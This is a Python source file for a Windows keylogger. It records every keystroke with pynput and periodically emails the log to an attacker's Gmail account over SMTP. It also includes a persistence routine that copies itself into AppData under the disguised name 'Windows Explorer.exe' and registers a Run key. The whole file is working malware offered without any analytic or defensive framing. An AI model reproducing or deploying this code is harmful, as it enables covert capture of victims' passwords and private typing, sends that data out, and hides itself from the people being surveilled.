from pynput.keyboard import Key , Listener
from threading import Timer
from smtplib import SMTP
import shutil
import os
import sys
import subprocess
class Loger:
	def __init__(self , ttiimmee , email , passw):
		self.log = " "
		self.time1 = ttiimmee
		self.mail = email
		self.pwds = passw
	def on_press(self,key):
		try:
			self.log = self.log + str(key.char)
		except AttributeError:
			if key == key.space:
				self.log = self.log + " "
			else :
				self.log = self.log + str(key)
	def hi(self,msg):
		ser = SMTP("smtp.gmail.com",587)
		ser.starttls()
		ser.login(self.mail , self.pwds)
		ser.sendmail(self.mail , self.mail , msg)
		ser.quit()
	def sen(self): 
		subject = 'mido'
		m = 'From: ' + self.mail + '\n''Subject: ' + subject + '\n' + self.log
		self.hi(m.encode('UTF-8'))
		timer = Timer(self.time1,self.sen)
		timer.start()
		self.log = " "

	def become_persistent_on_windows(self):
		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable, evil_file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)

		subject = "test"
		m = 'from' + self.mail + '\n''subject'+ subject +'\n' + self.log
		self.hi(m.encode('UTF-8'))
		timer = Timer(self.time1 , self.sen)
		timer.start()
		self.log = " "
	def start(self):
		with Listener(on_press=self.on_press) as lis:
			#self.become_persistent_on_windows()
			self.sen()
			(lis.join())
